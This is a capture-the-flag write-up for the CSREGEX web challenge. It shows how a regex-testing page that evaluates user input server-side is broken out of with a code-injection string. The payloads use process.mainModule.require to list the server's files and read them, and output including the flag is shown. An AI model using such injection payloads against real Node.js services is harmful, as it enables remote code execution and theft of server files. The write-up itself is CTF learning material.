original is clearly better:  
[original
writup](https://github.com/tHoMaStHeThErMoNuClEaRbOmB/ctfwriteups/blob/master/CyberSecurityRumblectf/web/CSRegex/README.md#solution)

writup here as well:  
# writup for CSREGEX challange  
description:  
```  
Stop pwning, start learning REGEX! This is such a fine way to ESCAPE the real
world...

http://chal.cybersecurityrumble.de:9876

Author: molatho|nviso

(72 solves)  
```

Table of contents  
=================

  * [how we got to the solution](#how_we_got_to_the_solution)  
  * [solution](#solution)

how we got to the solution  
=============================

we are greeted with a regex tesiting page, In the main box you can enter a
regular expression, which will be evaluated and the output will be shown in
the bottom

```  
'A regular expression (shortened as regex or regexp; also referred to as
rational expression) is a sequence of characters that define a search pattern.
Usually such patterns are used by string-searching algorithms for "find" or
"find and replace" operations on strings, or for input validation. It is a
technique developed in theoretical computer science and formal language
theory.\n\nThe concept arose in the 1950s when the American mathematician
Stephen Cole Kleene formalized the description of a regular language. The
concept came into common use with Unix text-processing utilities. Different
syntaxes for writing regular expressions have existed since the 1980s, one
being the POSIX standard and another, widely used, being the Perl
syntax.\n\nRegular expressions are used in search engines, search and replace
dialogs of word processors and text editors, in text processing utilities such
as sed and AWK and in lexical analysis. Many programming languages provide
regex capabilities either built-in or via
libraries.\n\nhttps://en.wikipedia.org/wiki/Regular_expression'.match(/<user
input regex>/gi)  
```  
this gets transmtted and evaluated on the server.  
Which makes the task pretty obvious, lets escape the .match expression and
have server side (remote) code execution

z'.match()/gi); <javascript code>;/  
- the first part `z'.match()/gi);` completes the string so it doesnt error  
- the end `;/` is to comment out the rest, `/gi`

so we have an RCE, what next?

"fetch is not defined" -- we are running on node and not a web browser

lets see what we can and cannot do:  
- we cannot call require  
- `child_process` and `fs` arent imported  
- we can use `return` to get any data back from the server

thats not much, but we found that we can infact call require by using
`process.mainModule.require`

so lets build a little script:  
we can return the contents of the current directory with the fs module  
```js  
//code:  
let files = [];  
const fs = process.mainModule.require('fs');  
fs.readdirSync(".").forEach(file => files.push(file) );  
return files;

// exploit:  
z'.match()/gi);let files = [];const fs = process.mainModule.require('fs');
fs.readdirSync(".").forEach(file =>  files.push(file) ); return files;/

// result:  
{"result":[".dockerignore","api.js","csregex","dist","dockerfile","index.js","leftover.js","node_modules","package-
lock.json","package.json","regexer.js","requests.log","simple-fs.js"]}

```

solution  
===========  
start reading the files to see if there is anything interesting in either one  
```js  
// code:  
const fs = process.mainModule.require('fs');  
const data = fs.readFileSync('api.js', 'utf8');  
return(data);/

// exploit:  
z'.match()/gi);const fs = process.mainModule.require('fs'); const data =
fs.readFileSync('dockerfile', 'utf8'); return(data);/

//results  
api.js: "var express = require('express');↵var router = express.Router();↵var
RegexEr = require('./regexer')↵↵router.get('/regex/:pattern/:flags/:input',
(req, res) => {↵    var params = {↵        pattern: req.params.pattern,↵
input: req.params.input,↵        flags: req.params.flags↵    };↵    try {↵
params.pattern = Buffer.from(req.params.pattern, 'base64').toString();↵
params.input = Buffer.from(req.params.input,
'base64').toString().replace(/\n/gm, "").trim();↵        params.flags =
Buffer.from(req.params.flags, 'base64').toString();↵
RegexEr.process(params.pattern, params.flags, params.input)↵
.then((result) => res.status(200).send({result: result}))↵
.catch((err) => res.status(400).send({ error: err.message }));↵↵    } catch
(ex) {↵        console.error(ex);↵
res.status(400).send(JSON.stringify(ex));↵    }↵↵});↵↵module.exports =
router;"  
dockerfile:"from mhart/alpine-node:12\nWORKDIR /app\nCOPY . .\nRUN apk
update\nRUN apk upgrade\nRUN apk add bash\nRUN apk add curl\nRUN npm
install\nRUN chown root:root .\nRUN chmod -R 755 .\nRUN adduser -D -g ''
server\nRUN touch requests.log\nRUN chown server:server requests.log\nRUN
chmod +s /usr/bin/curl\nRUN echo 'CSR{r363x_15_fun_r363x_15_l0v3}' >
/root/flaggerino_flaggeroni.toxt\nRUN chmod 640
/root/flaggerino_flaggeroni.toxt\nRUN chmod 744 /root\nUSER server\nEXPOSE
8080\nCMD [ \"node\", \"index.js\"]  
```

sure enought dockerfile had the flag  
```  
RUN echo 'CSR{r363x_15_fun_r363x_15_l0v3}'  
```